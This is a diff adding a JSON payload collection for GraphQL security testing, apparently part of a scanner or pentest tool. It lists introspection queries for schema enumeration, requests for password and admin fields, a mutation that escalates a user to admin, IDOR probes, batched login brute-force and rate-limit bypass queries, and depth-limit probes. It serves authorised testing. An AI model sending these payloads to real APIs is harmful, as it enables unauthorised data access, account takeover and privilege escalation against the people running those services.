@@ -1,0 +1,42 @@
+{
+  "category": "graphql",
+  "contexts": {
+    "introspection": {
+      "description": "GraphQL introspection queries for schema enumeration",
+      "payloads": [
+        {"payload": "{\"query\":\"{__schema{types{name,fields{name,type{name}}}}}\"}",  "description": "Full schema introspection — list all types and fields", "waf_bypass": false},
+        {"payload": "{\"query\":\"{__type(name:\\\"User\\\"){fields{name,type{name}}}}\"}",  "description": "Single type introspection — User object", "waf_bypass": false},
+        {"payload": "{\"query\":\"{__schema{mutationType{fields{name,args{name,type{name}}}}}}\"}",  "description": "List all mutations with arguments", "waf_bypass": false},
+        {"payload": "{\"query\":\"{__schema{queryType{fields{name}}}}\"}",  "description": "List all query fields", "waf_bypass": false},
+        {"payload": "{\"query\":\"{__schema{subscriptionType{fields{name}}}}\"}",  "description": "List subscription fields (WebSocket data streams)", "waf_bypass": false}
+      ]
+    },
+    "injection": {
+      "description": "GraphQL field and argument injection payloads",
+      "payloads": [
+        {"payload": "{\"query\":\"query{user(id:1){id,email,password,role,isAdmin}}\"}",  "description": "Request sensitive fields — password, role, isAdmin", "waf_bypass": false},
+        {"payload": "{\"query\":\"query{users{id,email,role}}\"}",  "description": "List all users — test for authorization", "waf_bypass": false},
+        {"payload": "{\"query\":\"mutation{updateUser(id:1,input:{role:\\\"admin\\\"}){id,role}}\"}",  "description": "Mutation privilege escalation — change role to admin", "waf_bypass": false},
+        {"payload": "{\"query\":\"query{user(id:2){id,email}}\"}",  "description": "IDOR via GraphQL — access another user's data", "waf_bypass": false},
+        {"payload": "{\"query\":\"{__typename}\",\"extensions\":{\"persistedQuery\":{\"sha256Hash\":\"abc\",\"version\":1}}}",  "description": "Persisted query probe — APQ hash validation", "waf_bypass": false}
+      ]
+    },
+    "batching": {
+      "description": "GraphQL query batching for rate limit bypass and auth testing",
+      "payloads": [
+        {"payload": "[{\"query\":\"{__typename}\"},{\"query\":\"{__typename}\"},{\"query\":\"{__typename}\"}]",  "description": "Array batching — 3 queries in one request (rate limit bypass)", "waf_bypass": false},
+        {"payload": "{\"query\":\"query{a:user(id:1){id} b:user(id:2){id} c:user(id:3){id}}\"}",  "description": "Alias batching — 3 aliased queries (IDOR enumeration)", "waf_bypass": false},
+        {"payload": "[{\"query\":\"mutation{login(email:\\\"test@test.com\\\",password:\\\"pass1\\\"){token}}\"},{\"query\":\"mutation{login(email:\\\"test@test.com\\\",password:\\\"pass2\\\"){token}}\"},{\"query\":\"mutation{login(email:\\\"test@test.com\\\",password:\\\"pass3\\\"){token}}\"}]",  "description": "Batched login mutations — brute force via single request", "waf_bypass": false},
+        {"payload": "{\"query\":\"query{a:__typename b:__typename c:__typename d:__typename e:__typename f:__typename g:__typename h:__typename i:__typename j:__typename}\"}",  "description": "10 aliased fields — test query complexity limits", "waf_bypass": false}
+      ]
+    },
+    "depth_and_complexity": {
+      "description": "GraphQL depth and complexity probes (non-destructive)",
+      "payloads": [
+        {"payload": "{\"query\":\"{user{friends{friends{friends{friends{id}}}}}}\"}",  "description": "Depth 5 nested query — test depth limiting", "waf_bypass": false},
+        {"payload": "{\"query\":\"{users(first:1000){edges{node{id,email}}}}\"}",  "description": "Large page size — test pagination limits", "waf_bypass": false},
+        {"payload": "{\"query\":\"{search(term:\\\"*\\\"){... on User{id} ... on Post{id} ... on Comment{id}}}\"}",  "description": "Union type fragment spread — test type resolution", "waf_bypass": false}
+      ]
+    }
+  }
+}
